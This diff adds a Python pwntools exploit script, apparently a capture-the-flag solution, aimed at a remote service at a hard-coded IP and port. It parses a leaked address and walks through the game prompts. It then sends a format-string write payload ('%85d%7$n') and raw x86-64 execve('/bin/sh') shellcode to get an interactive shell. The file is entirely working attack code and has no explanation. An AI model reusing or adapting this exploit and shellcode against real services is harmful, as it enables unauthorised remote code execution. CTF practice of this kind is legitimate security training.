@@ -1,0 +1,24 @@
+from pwn import *
+
+p = remote('220.249.52.133',52648)
+p.recvuntil("secret[0] is ")
+v4_addr=p.recvuntil("\n")
+print(v4_addr)
+v4_address=int(v4_addr,16)
+print v4_address
+p.recvuntil("What should your character's name be:")
+p.sendline('b1nd')
+p.recvuntil('So, where you will go?east or up?:')
+p.sendline('east')
+p.recvuntil('go into there(1), or leave(0)?:')
+p.sendline('1')
+p.recvuntil('Give me an address')
+p.sendline(str(v4_address))
+p.recvuntil("you wish is:\n")
+payload = "%85d%7$n"
+p.sendline(payload)
+#shellcode = asm(shellcraft.sh())
+shellcode = "\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05" 
+p.recvuntil("Wizard: I will help you! USE YOU SPELL")
+p.sendline(shellcode)
+p.interactive()
